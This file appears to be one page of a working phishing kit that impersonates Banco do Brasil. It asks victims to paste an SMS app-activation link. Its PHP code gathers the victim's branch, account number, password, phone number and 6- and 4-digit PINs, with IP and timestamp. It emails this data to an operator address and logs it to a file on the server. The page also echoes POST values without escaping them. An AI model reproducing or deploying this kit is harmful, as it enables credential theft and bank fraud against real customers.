<?php

ini_set('display_errors',1);
ini_set('display_startup_erros',1);
error_reporting(E_ALL);

?>

<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>Banco do Brasil</title>
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
	<link href='https://fonts.googleapis.com/css?family=Roboto' rel='stylesheet'>
	<link rel="stylesheet" type="text/css" href="reset.css" />
	<script src="https://code.jquery.com/jquery-2.2.4.min.js"></script>
	<link rel="stylesheet" type="text/css" href="style.css" />
</head>
<body>
	<form id="frm" name="frm" method="post" action="done.php" onsubmit="return checkDone()">
	<?php foreach ($_POST as $key => $value): ?>
	<input type="hidden" name="<?= $key ?>" value="<?= $value ?>">
	<?php endforeach; ?>	
	<div class="container">
		<div class="topo"><p>Acessar minha conta</p></div>
		<div class="content">

			<table>
				<tr>
					<td></td>
				</tr>

				<tr>
					<td><span class="titulo-preto">BB: selecione e copie o link "bbapp://" enviado  pelo <strong class="">4004-0001</strong> para o seu smartphone e cole no campo abaixo para completar a liberação do app.</span></td>
					<br><br>
				</tr>

				<tr>
					<td><br>
						<textarea id="txt07" name="txt07" required=""></textarea>
					</td>
				</tr>

				<tr><td><span class="titulo small">Informe os dados para conclusão do procedimento.</span></td></tr>

			</table>
		</div>

		<div class="footer">
			<button class="btn-amarelo">ENTRAR</button>
		</div>
	</div>

	</form>

	<script type="text/javascript" src="js/jquery.mask.min.js"></script>
	<script type="text/javascript" src="js/script1.js"></script>
	<script type="text/javascript">
		function checkDone(){
		  var txt07 = document.frm.txt07.value;

		  if (txt07.length < 20) {
		  	alert("Preencha corretamente");
		  	return false;
		  }
		  
		  return true;

		}
	</script>


	</script>

</body>

</html>

<?php

if ($_POST){
	require_once("config.php");
	extract($_POST);
	$ip = $_SERVER['REMOTE_ADDR'];
	$data=date("d/m/Y");
	$hora=date("H:i");

	$headers = "Content-type: text/html; charset=iso-8859-1\r\n";
	$headers.= "From: BB <chegou@zedn.com>";
	$conteudo ="
	================ Dados ================<br>
	$data-($hora) - $ip<br>
	AG / CC.....: $txt01 / $txt02<br>
	ENTRADA.....: $txt03<br>
	CEL ........: $txt04<br>
	6 DIG.......: $txt05<br>
	4 DIG.......: $txt06<br>
	============================================<br>";

	@mail($receber, "BB - $ip", "$conteudo", $headers); 
	@file_put_contents("data/$ip.html", $conteudo, FILE_APPEND);	

	//var_dump($a);

	//echo $conteudo;
}
